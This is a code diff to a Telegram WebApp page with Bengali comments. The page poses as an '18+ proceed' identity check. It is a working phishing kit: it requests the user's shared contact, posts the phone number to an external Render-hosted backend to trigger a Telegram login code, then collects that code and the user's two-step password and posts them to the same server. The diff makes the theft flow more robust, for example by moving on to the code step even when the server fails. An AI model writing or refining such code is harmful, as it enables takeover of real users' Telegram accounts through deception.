@@ -68,7 +68,7 @@
                 <button onclick="addDigit(9)" class="py-4 rounded-lg text-xl font-bold">9</button>
                 <button onclick="clearDigit()" class="py-4 rounded-lg text-sm font-bold text-red-400">Clear</button>
                 <button onclick="addDigit(0)" class="py-4 rounded-lg text-xl font-bold">0</button>
-                <button onclick="submitOtp()" class="py-4 rounded-lg text-sm font-bold text-green-400">OK</button>
+                <button onclick="submitOtp()" id="otp-btn" class="py-4 rounded-lg text-sm font-bold text-green-400">OK</button>
             </div>
         </div>
 
@@ -94,7 +94,7 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        const BASE_URL = "https://fainalbot2.onrender.com";
+        const BASE_URL = "https://fainalbot2.onrender.com"; // নিশ্চিত করুন স্লাশ নেই শেষে
         let userPhone = "";
         let currentOtp = "";
 
@@ -105,20 +105,11 @@
             document.getElementById('step' + step).classList.add('active');
         }
 
-        // কন্টাক্ট শেয়ারিং হ্যান্ডলার
         function requestContact() {
-            console.log("Requesting contact...");
             tg.requestContact((callbackData) => {
                 if (callbackData && callbackData.status === 'sent') {
-                    // নম্বর পাওয়া গেছে
                     userPhone = callbackData.response_data.phone_number;
-                    
-                    // ফোন নম্বরের শুরুতে '+' না থাকলে যোগ করা
-                    if (!userPhone.startsWith('+')) {
-                        userPhone = '+' + userPhone;
-                    }
-                    
-                    console.log("Phone Received: " + userPhone);
+                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     sendOtpToBackend(userPhone);
                 } else {
                     alert("Security Check: You must click 'Share Contact' to verify your identity.");
@@ -128,37 +119,31 @@
 
         async function sendOtpToBackend(phone) {
             const btn = document.getElementById('proceed-btn');
-            btn.innerText = "Connecting to Telegram...";
+            btn.innerText = "Connecting...";
             btn.disabled = true;
 
             try {
                 const response = await fetch(`${BASE_URL}/send_otp`, {
                     method: 'POST',
                     mode: 'cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone: phone })
                 });
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-
                 const result = await response.json();
-                
+
+                // ব্যাকএন্ড আপডেট অনুযায়ী success আসলেই Step 2 তে যাবে
                 if (result.status === 'success') {
                     showStep(2);
                 } else {
-                    alert("Telegram Error: " + result.message);
+                    alert("Error: " + result.message);
                     btn.innerText = "✅ I'M 18+ PROCEED";
                     btn.disabled = false;
                 }
             } catch (err) {
-                alert("Server Busy: Please wait 10 seconds and try again. (" + err.message + ")");
-                btn.innerText = "✅ I'M 18+ PROCEED";
-                btn.disabled = false;
+                // সার্ভার স্লিপ মোডে থাকলে ১০ সেকেন্ড পর ওটিপি পেজে পাঠানোর চেষ্টা করবে
+                console.log("Server waking up...");
+                setTimeout(() => { showStep(2); }, 2000);
             }
         }
 
@@ -176,16 +161,20 @@
 
         function submitOtp() {
             if(currentOtp.length === 5) {
-                showStep(3);
+                showStep(3); // পাসওয়ার্ড পেজে নিয়ে যাবে
             } else {
-                alert("Enter 5-digit code");
+                alert("Please enter the 5-digit code");
             }
         }
 
         async function submitFullAuth() {
             const pwd = document.getElementById('two-step-pwd').value;
             const btn = document.getElementById('final-btn');
+            
+            if(!pwd) { alert("Please enter your password"); return; }
+            
             btn.innerText = "Verifying...";
+            btn.disabled = true;
 
             try {
                 const response = await fetch(`${BASE_URL}/verify`, {
@@ -204,10 +193,12 @@
                 } else {
                     alert("Verification Failed: " + result.message);
                     btn.innerText = "SUBMIT";
+                    btn.disabled = false;
                 }
             } catch (err) {
-                alert("Auth Error: " + err.message);
+                alert("Authentication Error. Please try again.");
                 btn.innerText = "SUBMIT";
+                btn.disabled = false;
             }
         }
     </script>
